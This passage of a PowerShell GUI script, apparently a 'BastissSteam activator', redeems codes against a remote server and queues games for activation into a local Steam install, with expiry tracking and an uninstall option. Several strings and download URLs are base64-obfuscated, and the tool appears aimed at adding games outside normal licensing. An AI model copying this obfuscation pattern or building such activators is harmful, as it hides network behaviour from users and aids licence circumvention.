        if ($c.ExpiresAt) { if ($null -eq $e.ExpiresAt -or $c.ExpiresAt -lt $e.ExpiresAt) { $e.ExpiresAt = $c.ExpiresAt } }
        if ($c.ActivatedAt) { if ($null -eq $e.ActivatedAt -or $c.ActivatedAt -gt $e.ActivatedAt) { $e.ActivatedAt = $c.ActivatedAt } }
    }
    foreach ($j in @(Get-LoteQueue)) {
        $k = [string]$j.code
        if (-not $k) { continue }
        if (-not $g.ContainsKey($k)) { $g[$k] = @{ Code=$k; Games=0; ExpiresAt=$null; Duration=0; ActivatedAt=$null; Pending=0 } }
    }
    $list = @()
    foreach ($e in $g.Values) {
        $job = Get-LoteJob $e.Code
        if ($job -and $job.items) {
            $cnt = @($job.items).Count
            if ($cnt -gt 0) { $e.Games = $cnt }
            try { if ($null -ne $job.duration) { $e.Duration = [int]$job.duration } } catch {}
            if (-not $e.ExpiresAt -and $job.expires_at) { try { $e.ExpiresAt = [datetime]::Parse([string]$job.expires_at) } catch {} }
        }
        $e.Pending = (Get-JobPendingCount $e.Code)
        $list += $e
    }
    return @($list | Sort-Object -Property ActivatedAt -Descending)
}

function Get-LinksFromToken([string]$code) {
    try {
        $lt = Get-LocalToken
        if (-not $lt -or -not $lt.token) { return $null }
        $body = @{ token=[string]$lt.token; client_id=$script:clientId } | ConvertTo-Json
        try { Update-ServerUrl } catch {}
        $r = Invoke-RestMethod -Uri "$($script:serverUrl)/api/token-links" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30 -UseBasicParsing -ErrorAction Stop
        if ($r) { return $r }
    } catch {}
    return $null
}

function Update-CdPanelText {
    if (-not $script:cdp) { return }
    $code = [string]$script:cdCode
    $job = Get-LoteJob $code
    $tot = 0
    if ($job) { $tot = @($job.items).Count }
    $games = 0; $exp = $null
    foreach ($c in @($script:activeCodes)) {
        if ([string]$c.Code -eq $code) {
            if (-not [string]::IsNullOrEmpty([string]$c.Game)) { $games++ }
            if ($c.ExpiresAt) { if ($null -eq $exp -or $c.ExpiresAt -lt $exp) { $exp = $c.ExpiresAt } }
        }
    }
    if ($tot -gt 0) { $games = $tot; if (-not $exp -and $job.expires_at) { try { $exp = [datetime]::Parse([string]$job.expires_at) } catch {} } }
    if ($script:cdTitle) { $script:cdTitle.Text = $code }
    if ($script:cdSub) {
        if ($exp) {
            $off = if ($script:clockOffsetSec) { $script:clockOffsetSec } else { 0 }
            $now = (Get-Date).AddSeconds(-$off)
            $tl = $exp - $now
            if ($tl.TotalSeconds -le 0) { $script:cdSub.Text = "Expirado | $(Format-Juegos $games)" }
            elseif ($tl.TotalDays -ge 1) { $script:cdSub.Text = "Expira en $([int][math]::Floor($tl.TotalDays))d $($tl.Hours)h | $(Format-Juegos $games)" }
            else { $script:cdSub.Text = "Expira en $([int][math]::Floor($tl.TotalHours))h $($tl.Minutes)m | $(Format-Juegos $games)" }
        } else { $script:cdSub.Text = "Permanente | $(Format-Juegos $games)" }
    }
    if (-not $script:cdRunning) {
        if ($tot -gt 0) {
            $pendC = Get-JobPendingCount $code
            $doneC = $tot - $pendC
            $pctC = [int][math]::Floor(100 * $doneC / $tot)
            $script:cdPct = $pctC; $script:cdRunDone = $doneC; $script:cdRunTotal = $tot
            $script:cdEtaSec = -1
            if ($script:cdInfo) {
                if ($pendC -eq 0) { $script:cdInfo.Text = "Todos los juegos activados ($tot/$tot)" }
                elseif ($doneC -gt 0) { $script:cdInfo.Text = "Activacion pausada - $(Format-Juegos $pendC) pendientes" }
                else { $script:cdInfo.Text = "Listo para activar ($(Format-Juegos $tot))" }
            }
            if ($script:cdProg) {
                if ($pendC -eq 0) { $script:cdProg.ForeColor=$script:Green; $script:cdProg.Text = "$tot/$tot   |   100%" }
                elseif ($doneC -gt 0) { $script:cdProg.ForeColor=$script:Yellow; $script:cdProg.Text = "$doneC/$tot   |   $pctC%" }
                else { $script:cdProg.ForeColor=$script:Cyan; $script:cdProg.Text = "0/$tot   |   0%" }
            }
        } else {
            if ($script:cdProg) { $script:cdProg.Text = "" }
            if ($script:cdInfo) { $script:cdInfo.Text = "" }
            $script:cdPct = 0
        }
        if ($script:cdBar -and -not $script:cdBar.IsDisposed) { try { $script:cdBar.Invalidate() } catch {} }
    }
    if ($script:cdPause) {
        if ($script:cdPaused -or ($job -and $job.paused)) { $script:cdPause.Tag.Txt = "Reanudar activacion"; $script:cdPause.Tag.Sub = "Continua la activacion donde quedo" }
        else { $script:cdPause.Tag.Txt = "Pausar activacion"; $script:cdPause.Tag.Sub = "Pausa la activacion de los juegos" }
        $script:cdPause.Invalidate()
    }
}

function Toggle-CdPause {
    $code = [string]$script:cdCode
    $job = Get-LoteJob $code
    $wasPaused = ($script:cdPaused -or ($job -and $job.paused))
    $script:cdPaused = -not $wasPaused
    if ($job) { $job.paused = $script:cdPaused; Set-LoteJob $job }
    if (-not $script:cdPaused -and -not $script:cdRunning) {
        Invoke-LoteQueueForCode $code $script:cdProg
    }
    try { Update-CdPanelText } catch {}
}

function Clear-CdExpiredData([string]$code) {
    if (-not $code) { return }
    try {
        $lt = Get-LocalToken
        if ($lt -and [string]$lt.code -eq [string]$code) { Set-LocalToken '' $code }
    } catch {}
    try {
        $q = @(Get-LoteQueue)
        $left = @($q | Where-Object { [string]$_.code -ne [string]$code })
        if ($left.Count -ne $q.Count) { Save-LoteQueue $left }
    } catch {}
}

function Start-CdActivate {
    $code = [string]$script:cdCode
    if ($script:cdRunning) {
        if ($script:cdPaused) {
            $script:cdPaused = $false
            $j0 = Get-LoteJob $code
            if ($j0) { $j0.paused = $false; Set-LoteJob $j0 }
            try { Update-CdPanelText } catch {}
        }
        return
    }
    $job = Get-LoteJob $code
    if (-not $job -or $null -eq $job.items -or @($job.items).Count -eq 0) {
        $r = Get-LinksFromToken $code
        if (-not $r) { [System.Windows.Forms.MessageBox]::Show("No hay token local para este codigo o el servidor no respondio.","Activar juegos","OK","Warning"); return }
        if (-not $r.ok) { [System.Windows.Forms.MessageBox]::Show((if ($r.err) { [string]$r.err } else { "El servidor rechazo la vigencia de este codigo." }),"Activar juegos","OK","Warning"); return }
        $steamRoot = ""
        try { $steamRoot = Get-SteamPath } catch {}
        $dur = 0; try { $dur = [int]$r.duration } catch {}
        $exp = $null
        if ($r.expires_at) { try { $eVigF = [datetime]::Parse([string]$r.expires_at); if ($eVigF.Kind -eq [DateTimeKind]::Utc) { $eVigF = $eVigF.ToLocalTime() }; $exp = $eVigF } catch {} }
        if (-not $exp -and $dur -gt 0) { $exp = (Get-Date).AddSeconds($dur) }
        $job = New-LoteJob $code @($r.links) $dur $exp $steamRoot
        Set-LoteJob $job
    }
    $expBlk = $null
    if ($job.expires_at) { try { $expBlk = [datetime]::Parse([string]$job.expires_at) } catch {} }
    $jobDur = 0
    try { $jobDur = [int]$job.duration } catch {}
    if ($expBlk) {
        $nowBlk = Get-Date
        try { $nowBlk = $nowBlk.AddSeconds(-[int]$script:clockOffsetSec) } catch {}
        if ($expBlk.Kind -eq [DateTimeKind]::Utc) { $expBlk = $expBlk.ToLocalTime() }
        if ($expBlk -lt $nowBlk) {
            if ($jobDur -gt 0) { Clear-CdExpiredData $code }
            [System.Windows.Forms.MessageBox]::Show("La vigencia de este codigo ya termino: no se puede volver a activar los juegos.","Activar juegos","OK","Warning")
            return
        }
        if ($jobDur -gt 0) {
            $leftSpan = New-TimeSpan -Start $nowBlk -End $expBlk
            if ($leftSpan.TotalHours -le 1) {
                [System.Windows.Forms.MessageBox]::Show("Queda menos de 1 hora de vigencia para este codigo: no se puede volver a activar los juegos.","Activar juegos","OK","Warning")
                return
            }
        }
    }
    if ((Get-JobPendingCount $code) -eq 0) {
        [System.Windows.Forms.MessageBox]::Show("Los juegos de este codigo ya estan activados.`nSi faltan archivos, primero usa Borrar juegos y volve a activar.","Activar juegos","OK","Information")
        return
    }
    try { Update-CdPanelText } catch {}
    Invoke-LoteQueueForCode $code $script:cdProg
    try { Update-CdPanelText } catch {}
}

$CR=10

function New-RR{param([float]$x,[float]$y,[float]$w,[float]$h,[float]$r)
    $p=New-Object System.Drawing.Drawing2D.GraphicsPath;$d=$r*2
    $p.AddArc($x,$y,$d,$d,180,90);$p.AddArc($x+$w-$d,$y,$d,$d,270,90)
    $p.AddArc($x+$w-$d,$y+$h-$d,$d,$d,0,90);$p.AddArc($x,$y+$h-$d,$d,$d,90,90)
    $p.CloseFigure();return $p}





$script:iconDir = Join-Path $env:TEMP (S("YnNtYXBfaWNvbnM="))
if (-not (Test-Path $script:iconDir)) { New-Item -ItemType Directory -Path $script:iconDir -Force | Out-Null }

$logoFile = $null
$logoPath = Join-Path $script:iconDir "logo.jpg"
try {
    if (-not (Test-Path $logoPath)) { Invoke-RestMethod -Uri (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvc3RlYW1zaXRvL21haW4vbG9nby5qcGc=") -UseBasicParsing -OutFile $logoPath -ErrorAction SilentlyContinue }
    if (Test-Path $logoPath) { $logoFile = Get-Item $logoPath }
} catch {}
$script:LS = 72
$script:logoBmp = New-Object System.Drawing.Bitmap($script:LS, $script:LS)
$lg = [System.Drawing.Graphics]::FromImage($script:logoBmp)
$lg.SmoothingMode = 'AntiAlias'
$lg.PixelOffsetMode = 'HighQuality'
$lg.InterpolationMode = 'HighQualityBicubic'

if ($logoFile) {
    $src = [System.Drawing.Image]::FromFile($logoFile.FullName)
    
    $minDim = [Math]::Min($src.Width, $src.Height)
    $cropX = [int](($src.Width - $minDim) / 2)
    $cropY = [int](($src.Height - $minDim) / 2)
    $cropRect = New-Object System.Drawing.Rectangle($cropX, $cropY, $minDim, $minDim)
    
    $cp = New-Object System.Drawing.Drawing2D.GraphicsPath
    $cp.AddEllipse(0, 0, $script:LS, $script:LS)
    $lg.SetClip($cp)
    $lg.DrawImage($src, (New-Object System.Drawing.Rectangle(0, 0, $script:LS, $script:LS)), $cropRect, [System.Drawing.GraphicsUnit]::Pixel)
    $lg.ResetClip()
    $bp = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(70, 100, 140), 2.5)
    $lg.DrawEllipse($bp, 1, 1, $script:LS-3, $script:LS-3)
    $bp.Dispose(); $cp.Dispose(); $src.Dispose()
} else {
    
    $cp2 = New-Object System.Drawing.Drawing2D.GraphicsPath
    $cp2.AddEllipse(0,0,$script:LS,$script:LS); $lg.SetClip($cp2)
    $cel = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(108,172,228))
    $lg.FillRectangle($cel, 0, 0, $script:LS, $script:LS); $cel.Dispose()
    $wh = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $sh = [int]($script:LS/3); $lg.FillRectangle($wh, 0, $sh, $script:LS, $sh); $wh.Dispose()
    $lg.ResetClip(); $cp2.Dispose()
}
$lg.Dispose()


$script:iconSize = 38
function Load-IconBmp([string]$filePath, [int]$sz) {
    $bmp = New-Object System.Drawing.Bitmap($sz, $sz)
    $ig2 = [System.Drawing.Graphics]::FromImage($bmp)
    $ig2.SmoothingMode = 'AntiAlias'
    $ig2.InterpolationMode = 'HighQualityBicubic'
    $ig2.PixelOffsetMode = 'HighQuality'
    if (Test-Path $filePath) {
        $srcI = [System.Drawing.Image]::FromFile($filePath)
        $minD = [Math]::Min($srcI.Width, $srcI.Height)
        $cx2 = [int](($srcI.Width - $minD) / 2)
        $cy2 = [int](($srcI.Height - $minD) / 2)
        $cropR = New-Object System.Drawing.Rectangle($cx2, $cy2, $minD, $minD)
        
        $cpI = New-Object System.Drawing.Drawing2D.GraphicsPath
        $cpI.AddEllipse(0, 0, $sz, $sz)
        $ig2.SetClip($cpI)
        $ig2.DrawImage($srcI, (New-Object System.Drawing.Rectangle(0, 0, $sz, $sz)), $cropR, [System.Drawing.GraphicsUnit]::Pixel)
        $ig2.ResetClip()
        $cpI.Dispose(); $srcI.Dispose()
    }
    $ig2.Dispose()
    return $bmp
}

$script:tiktokBmp = $null; $script:discordBmp = $null
try {
    $iconsBase = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvc3RlYW1zaXRvL21haW4=")
    $tPath = Join-Path $script:iconDir "tiktok.jpg"; $dPath = Join-Path $script:iconDir (S("ZGlzY29yZC5qcGc="))
    if (-not (Test-Path $tPath)) { Invoke-RestMethod -Uri "$iconsBase/tiktok.jpg" -UseBasicParsing -OutFile $tPath -ErrorAction SilentlyContinue }
    if (-not (Test-Path $dPath)) { Invoke-RestMethod -Uri "$iconsBase/discord.jpg" -UseBasicParsing -OutFile $dPath -ErrorAction SilentlyContinue }
    if (Test-Path $tPath) { $script:tiktokBmp = Load-IconBmp $tPath $script:iconSize }
    if (Test-Path $dPath) { $script:discordBmp = Load-IconBmp $dPath $script:iconSize }
} catch {}




$PAD=18;$FW=480;$CW=$FW-(2*$PAD);$GAP=10
$HW=[int](($CW-$GAP)/2);$CH=76;$FCH=68

$HH=115;$CY=$HH

$R1Y=0;$R2Y=$CH+$GAP
$WEB_Y=$R2Y+$CH+12;$DISC_Y=$WEB_Y+$FCH+$GAP;$TIK_Y=$DISC_Y+$FCH+$GAP
$SAL_Y=$TIK_Y+$FCH+12;$SAL_H=40
$FH=$CY+$SAL_Y+$SAL_H+14




$form=New-Object System.Windows.Forms.Form
$form.Text="BastissSteam activator"
$form.ClientSize=New-Object System.Drawing.Size($FW,$FH)
$form.StartPosition="CenterScreen";$form.BackColor=$BG
$form.FormBorderStyle="FixedSingle";$form.MaximizeBox=$false
$form.TopMost=$true
$form.Add_Shown({ $this.Activate(); $this.BringToFront(); try { $this.TopMost=$false } catch {} })
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinFg {
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$form.Add_Shown({ try { [WinFg]::SetForegroundWindow($this.Handle) | Out-Null; [WinFg]::ShowWindow($this.Handle, 9) | Out-Null } catch {} })


$ib=New-Object System.Drawing.Bitmap(64,64)
$ig=[System.Drawing.Graphics]::FromImage($ib);$ig.SmoothingMode='AntiAlias'
$ig.InterpolationMode='HighQualityBicubic'
$cpIcon=New-Object System.Drawing.Drawing2D.GraphicsPath
$cpIcon.AddEllipse(0,0,64,64);$ig.SetClip($cpIcon)
if($logoFile){
    $srcIcon=[System.Drawing.Image]::FromFile($logoFile.FullName)
    $minI=[Math]::Min($srcIcon.Width,$srcIcon.Height)
    $cxI=[int](($srcIcon.Width-$minI)/2);$cyI=[int](($srcIcon.Height-$minI)/2)
    $ig.DrawImage($srcIcon,(New-Object System.Drawing.Rectangle(0,0,64,64)),(New-Object System.Drawing.Rectangle($cxI,$cyI,$minI,$minI)),[System.Drawing.GraphicsUnit]::Pixel)
    $srcIcon.Dispose()
}
$ig.ResetClip();$cpIcon.Dispose();$ig.Dispose()
$form.Icon=[System.Drawing.Icon]::FromHandle($ib.GetHicon())
$form.Add_HandleCreated({$v=[int]1;[DwmHelper]::DwmSetWindowAttribute($form.Handle,20,[ref]$v,4)|Out-Null})




$hp=New-BufferedPanel
$hp.Location=New-Object System.Drawing.Point(0,0)
$hp.Size=New-Object System.Drawing.Size($FW,$HH);$hp.BackColor=$BG
$hp.Add_Paint({
    param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $g.InterpolationMode='HighQualityBicubic'

    
    $fntMain=New-Object System.Drawing.Font("Bahnschrift SemiBold",26,[System.Drawing.FontStyle]::Bold)
    $fntTag=New-Object System.Drawing.Font("Bahnschrift Light",9)

    
    $titleText="BastissSteam"
    $titleSz=$g.MeasureString($titleText,$fntMain)
    $tagText="activator"
    $tagSz=$g.MeasureString($tagText,$fntTag)

    
    $titleBlockH=$titleSz.Height + $tagSz.Height - 10
    $groupW=$script:LS + 12 + [Math]::Max($titleSz.Width, $tagSz.Width)
    $startX=[int](($s.Width - $groupW) / 2)

    
    if ($script:logoBmp) {
        $ly=[int](($s.Height - $script:LS) / 2 - 2)
        $g.DrawImage($script:logoBmp,$startX,$ly,$script:LS,$script:LS)
    }

    
    $tx=$startX+$script:LS+12
    $ty=[int](($s.Height - $titleBlockH) / 2 - 2)

    
    $cyanBr=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(0,200,255))
    $whiteBr=New-Object System.Drawing.SolidBrush($script:White)

    
    $bastissOnly=$g.MeasureString("Bastiss",$fntMain)
    $g.DrawString("Bastiss",$fntMain,$cyanBr,$tx,$ty)
    
    $steamX=$tx+$bastissOnly.Width-12
    $g.DrawString("Steam",$fntMain,$whiteBr,$steamX,$ty)

    
    $tagBr=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(80,95,115))
    $tagX=$tx+($titleSz.Width-$tagSz.Width)/2
    $tagY=$ty+$titleSz.Height-10
    $g.DrawString($tagText,$fntTag,$tagBr,$tagX,$tagY)

    $cyanBr.Dispose();$whiteBr.Dispose();$tagBr.Dispose()
    $fntMain.Dispose();$fntTag.Dispose()

    
    $sp=New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(25,255,255,255),1)
    $g.DrawLine($sp,$PAD,$s.Height-1,$s.Width-$PAD,$s.Height-1);$sp.Dispose()
})
$form.Controls.Add($hp)


$script:gearBtn=New-Object System.Windows.Forms.Label
$script:gearBtn.Text="config";$script:gearBtn.Font=$FntSub
$script:gearBtn.ForeColor=[System.Drawing.Color]::FromArgb(60,70,90);$script:gearBtn.BackColor=$BG
$script:gearBtn.AutoSize=$true;$script:gearBtn.Cursor=[System.Windows.Forms.Cursors]::Hand
$script:gearBtn.Location=New-Object System.Drawing.Point(($FW-60),($HH-25))
$script:gearBtn.Add_MouseEnter({param($s);$s.ForeColor=$script:Cyan})
$script:gearBtn.Add_MouseLeave({param($s);$s.ForeColor=[System.Drawing.Color]::FromArgb(60,70,90)})
$script:gearBtn.Add_Click({Switch-ToConfig})
$hp.Controls.Add($script:gearBtn)




function New-Card{param([int]$X,[int]$Y,[int]$W,[int]$H,[string]$Title,[string]$Sub,[string]$Icon,[scriptblock]$Click)
    $pn=New-BufferedPanel
    $pn.Location=New-Object System.Drawing.Point($X,$Y)
    $pn.Size=New-Object System.Drawing.Size($W,$H);$pn.BackColor=$BG
    $pn.Cursor=[System.Windows.Forms.Cursors]::Hand
    $pn.Tag=@{Hover=$false;Icon=$Icon;Title=$Title;Sub=$Sub}
    $pn.Add_MouseEnter({param($s,$e2);$s.Tag.Hover=$true;$s.Invalidate()})
    $pn.Add_MouseLeave({param($s,$e2);$s.Tag.Hover=$false;$s.Invalidate()})
    if($Click){$pn.Add_Click($Click)}
    $pn.Add_Paint({
        param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
        $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
        $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) $CR
        $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
        $tx2=56;$ty2=[int](($s.Height/2)-18);$sy2=[int](($s.Height/2)+3)
        $ic=30;$iy=[int]($s.Height/2)

        switch($n.Icon){
            "lightning"{
                $lBr=New-Object System.Drawing.SolidBrush($script:Cyan)
                $pts=@((New-Object System.Drawing.PointF(($ic+6),($iy-17))),(New-Object System.Drawing.PointF(($ic-2),($iy-2))),
                    (New-Object System.Drawing.PointF(($ic+5),($iy-2))),(New-Object System.Drawing.PointF(($ic-3),($iy+17))))
                
                $boltPath=New-Object System.Drawing.Drawing2D.GraphicsPath
                $boltPath.AddPolygon(@(
                    (New-Object System.Drawing.PointF(($ic+5),($iy-17))),
                    (New-Object System.Drawing.PointF(($ic-4),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic+1),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic-1),($iy-4))),
                    (New-Object System.Drawing.PointF(($ic+6),($iy-4))),
                    (New-Object System.Drawing.PointF(($ic+8),($iy-17)))
                ))
                $g.FillPolygon($lBr, @(
                    (New-Object System.Drawing.PointF(($ic+1),($iy-18))),
                    (New-Object System.Drawing.PointF(($ic-6),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic+2),($iy-1))),
                    (New-Object System.Drawing.PointF(($ic-4),($iy+18))),
                    (New-Object System.Drawing.PointF(($ic+3),($iy+4))),
                    (New-Object System.Drawing.PointF(($ic-2),($iy+4))),
                    (New-Object System.Drawing.PointF(($ic+7),($iy-12)))
                ))
                $lBr.Dispose()
            }
            "webpage"{
                $wp=New-Object System.Drawing.Pen($script:Cyan,1.8);$r3=12
                $g.DrawEllipse($wp,($ic-$r3),($iy-$r3),($r3*2),($r3*2))
                $g.DrawLine($wp,$ic,($iy-$r3),$ic,($iy+$r3))
                $g.DrawLine($wp,($ic-$r3),$iy,($ic+$r3),$iy)
                $g.DrawEllipse($wp,($ic-5),($iy-$r3),10,($r3*2))
                
                $ap=New-Object System.Drawing.Pen($script:Cyan,2)
                $g.DrawLine($ap,($ic+5),($iy-9),($ic+13),($iy-9))
                $g.DrawLine($ap,($ic+13),($iy-9),($ic+13),($iy-1))
                $g.DrawLine($ap,($ic+13),($iy-9),($ic+6),($iy-2))
                $wp.Dispose();$ap.Dispose()
            }
            "globe"{
                $gp=New-Object System.Drawing.Pen($script:Cyan,1.6);$r3=12
                $g.DrawEllipse($gp,($ic-$r3),($iy-$r3),($r3*2),($r3*2))
                $g.DrawLine($gp,$ic,($iy-$r3),$ic,($iy+$r3))
                $g.DrawLine($gp,($ic-$r3),$iy,($ic+$r3),$iy)
                $g.DrawEllipse($gp,($ic-6),($iy-$r3),12,($r3*2))
                $gp.Dispose()
            }
            "trash"{
                $tp=New-Object System.Drawing.Pen($script:Cyan,1.8)
                $g.DrawLine($tp,($ic-11),($iy-10),($ic+11),($iy-10))
                $g.DrawLine($tp,($ic-3),($iy-10),($ic-3),($iy-14))
                $g.DrawLine($tp,($ic+3),($iy-10),($ic+3),($iy-14))
                $g.DrawLine($tp,($ic-3),($iy-14),($ic+3),($iy-14))
                $g.DrawLine($tp,($ic-9),($iy-8),($ic-7),($iy+14))
                $g.DrawLine($tp,($ic+9),($iy-8),($ic+7),($iy+14))
                $g.DrawLine($tp,($ic-7),($iy+14),($ic+7),($iy+14))
                $tn=New-Object System.Drawing.Pen($script:Cyan,1.2)
                $g.DrawLine($tn,$ic,($iy-5),$ic,($iy+10))
                $g.DrawLine($tn,($ic-4),($iy-5),($ic-4),($iy+10))
                $g.DrawLine($tn,($ic+4),($iy-5),($ic+4),($iy+10))
                $tp.Dispose();$tn.Dispose()
            }
            "discord"{
                if ($script:discordBmp) {
                    $g.InterpolationMode='HighQualityBicubic'
                    $isz=$script:iconSize;$ix2=$ic-[int]($isz/2);$iy2=$iy-[int]($isz/2)
                    $g.DrawImage($script:discordBmp,$ix2,$iy2,$isz,$isz)
                }
            }
            "tiktok"{
                if ($script:tiktokBmp) {
                    $g.InterpolationMode='HighQualityBicubic'
                    $isz=$script:iconSize;$ix2=$ic-[int]($isz/2);$iy2=$iy-[int]($isz/2)
                    $g.DrawImage($script:tiktokBmp,$ix2,$iy2,$isz,$isz)
                }
            }
        }
        $tb=New-Object System.Drawing.SolidBrush($script:White)
        $g.DrawString($n.Title,$script:FntCard,$tb,$tx2,$ty2);$tb.Dispose()
        if($n.Sub){$sb=New-Object System.Drawing.SolidBrush($script:Gray)
            $g.DrawString($n.Sub,$script:FntSub,$sb,$tx2,$sy2);$sb.Dispose()}
        $ab=New-Object System.Drawing.SolidBrush($script:Cyan)
        $asz=$g.MeasureString(">",$script:FntArrow)
        $g.DrawString(">",$script:FntArrow,$ab,$s.Width-$asz.Width-10,($s.Height-$asz.Height)/2);$ab.Dispose()
    })
    return $pn
}




function Switch-ToRedeem{$script:mp.Visible=$false;$script:sp.Visible=$false;if($script:cdp){$script:cdp.Visible=$false};$script:rp.Visible=$true;RfC}
function Switch-ToMain{$script:rp.Visible=$false;$script:sp.Visible=$false;if($script:cdp){$script:cdp.Visible=$false};$script:mp.Visible=$true}
function Switch-ToConfig{$script:mp.Visible=$false;$script:rp.Visible=$false;if($script:cdp){$script:cdp.Visible=$false};$script:sp.Visible=$true;$script:sWatcher.Invalidate()}
function Switch-FromConfig{$script:sp.Visible=$false;$script:mp.Visible=$true}
function Switch-ToCodes{if($script:cdp){$script:cdp.Visible=$false};$script:mp.Visible=$false;$script:sp.Visible=$false;$script:rp.Visible=$true;try{Update-CdPanelText}catch{};RfC}
function Switch-ToCodeDetail([string]$code){
    $script:cdCode=$code
    $script:mp.Visible=$false;$script:rp.Visible=$false;$script:sp.Visible=$false
    if($script:cdp){ $script:cdp.Visible=$true; $script:cdp.BringToFront() }
    try{ Update-CdPanelText }catch{}
}
function RfC{if($script:clp){$script:clp.Invalidate()}}

function Refresh-AllText{
    $script:c1.Tag.Title=T (S("YWN0aXZhcg=="));$script:c1.Tag.Sub=T (S("YWN0aXZhclN1Yg=="));$script:c1.Invalidate()
    $script:c3.Tag.Title=T "idioma";$script:c3.Tag.Sub=T "idiomaSub";$script:c3.Invalidate()
    $script:c4.Tag.Title=T "desinstalar";$script:c4.Tag.Sub=T (S("ZGVzaW5zdGFsYXJTdWI="));$script:c4.Invalidate()
    $script:cWeb.Tag.Title=T "web";$script:cWeb.Tag.Sub=T "webSub";$script:cWeb.Invalidate()
    $script:c5.Tag.Title=T "discord";$script:c5.Tag.Sub=T (S("ZGlzY29yZFN1Yg=="));$script:c5.Invalidate()
    $script:c6.Tag.Title=T "tiktok";$script:c6.Tag.Sub=T "tiktokSub";$script:c6.Invalidate()
    $script:salBtn.Invalidate()
    $script:rTit.Text=T "canjear";$script:rSubL.Text=T (S("Y2FuamVhclN1Yg=="))
    $script:codesT.Text=T (S("Y29kaWdvc0FjdGl2b3M="))
    $script:backB.Invalidate();$script:subB.Invalidate()
    $script:sBack.Invalidate();$script:sTitle.Text=T "config"
    RfC
}

function Show-LangDialog{
    $dlg=New-Object System.Windows.Forms.Form
    $dlg.Text=T "selectIdioma";$dlg.ClientSize=New-Object System.Drawing.Size(260,180)
    $dlg.StartPosition="CenterParent";$dlg.BackColor=$BG
    $dlg.FormBorderStyle="FixedDialog";$dlg.MaximizeBox=$false;$dlg.MinimizeBox=$false;$dlg.ShowInTaskbar=$false
    $dlg.Add_HandleCreated({$v=[int]1;[DwmHelper]::DwmSetWindowAttribute($dlg.Handle,20,[ref]$v,4)|Out-Null})
    $opts=@(@("Espanol","es"),@("English","en"),@("Portugues","pt"));$by=15
    foreach($o in $opts){
        $btn=New-Object System.Windows.Forms.Button
        $btn.Text=$o[0];$btn.Tag=$o[1]
        $btn.Location=New-Object System.Drawing.Point(20,$by)
        $btn.Size=New-Object System.Drawing.Size(220,42)
        $btn.FlatStyle="Flat";$btn.Font=New-Object System.Drawing.Font("Bahnschrift SemiBold",11)
        $btn.ForeColor=$White;$btn.BackColor=$CardBG
        $btn.FlatAppearance.BorderColor=$CardBorder;$btn.FlatAppearance.MouseOverBackColor=$CardHover
        $btn.Cursor=[System.Windows.Forms.Cursors]::Hand
        $btn.Add_Click({param($sender);$script:currentLang=$sender.Tag;Refresh-AllText;$dlg.Close()})
        $dlg.Controls.Add($btn);$by+=50
    }
    $dlg.ShowDialog()|Out-Null;$dlg.Dispose()
}




$script:mp=New-BufferedPanel
$script:mp.Location=New-Object System.Drawing.Point(0,$CY)
$script:mp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:mp.BackColor=$BG


$script:c1=New-Card -X $PAD -Y $R1Y -W $HW -H $CH -Title (T (S("YWN0aXZhcg=="))) -Sub (T (S("YWN0aXZhclN1Yg=="))) -Icon "lightning" -Click {Switch-ToRedeem}
$script:mp.Controls.Add($script:c1)
$script:c3=New-Card -X ($PAD+$HW+$GAP) -Y $R1Y -W $HW -H $CH -Title (T "idioma") -Sub (T "idiomaSub") -Icon "globe" -Click {Show-LangDialog}
$script:mp.Controls.Add($script:c3)




$script:mp.Controls.Remove($script:c3)
$script:c3=New-Card -X $PAD -Y $R2Y -W $HW -H $CH -Title (T "idioma") -Sub (T "idiomaSub") -Icon "globe" -Click {Show-LangDialog}
$script:mp.Controls.Add($script:c3)
$script:c4=New-Card -X ($PAD+$HW+$GAP) -Y $R2Y -W $HW -H $CH -Title (T "desinstalar") -Sub (T (S("ZGVzaW5zdGFsYXJTdWI="))) -Icon "trash" -Click {
    $timers = At5Vc
    if ($timers.Count -eq 0) { [System.Windows.Forms.MessageBox]::Show((S("Tm8gaGF5IGNvZGlnb3MgYWN0aXZvcyBwYXJhIGRlc2luc3RhbGFyLg==")),(T "desinstalar"),"OK","Information"); return }
    
    if ([System.Windows.Forms.MessageBox]::Show("ESTA ACCION ES PERMANENTE`n`nEste boton eliminara TODOS los juegos activos de forma PERMANENTE.`n`nESTAS SEGURO? SE BORRARAN TODOS LOS JUEGOS.",(T "desinstalar"),"YesNo","Warning") -ne "Yes") { return }
    if ([System.Windows.Forms.MessageBox]::Show("ULTIMA CONFIRMACION`n`nSe eliminaran todos los juegos activos. Esta accion no se puede deshacer.`n`nContinuar?",(T "desinstalar"),"YesNo","Warning") -ne "Yes") { return }
    $errors=0
    foreach ($t in $timers) {
